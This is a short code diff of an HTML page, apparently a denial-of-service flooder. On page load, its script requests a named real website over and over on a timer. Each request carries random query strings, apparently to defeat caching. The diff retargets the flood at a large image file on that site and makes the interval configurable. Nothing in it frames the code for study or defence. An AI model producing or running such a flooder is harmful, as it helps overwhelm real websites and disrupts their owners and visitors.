@@ -7,18 +7,18 @@
             console.log(target);
         };
 
-        var start_it = function(target){
+        var start_it = function(target, seq){
 
           setInterval(function() {
 
             doit(target+(target.indexOf('?') > 0 ? '&' : '?')+Math.random().toString(36).substr(2, 7)+'='+Math.random().toString(36).substr(2, 7));
 
-          }, 100);
+          }, seq);
 
         };
 
   </script>
   </head>
 
-<body onload="start_it('https://www.smokturkey.org/?a=1');"></body>
+<body onload="start_it('https://www.smokturkey.org/image/cache/catalog/Eleaf-iStick-Pico-RESIN-Kit-1140x380.jpg', 1000);"></body>
 </html>
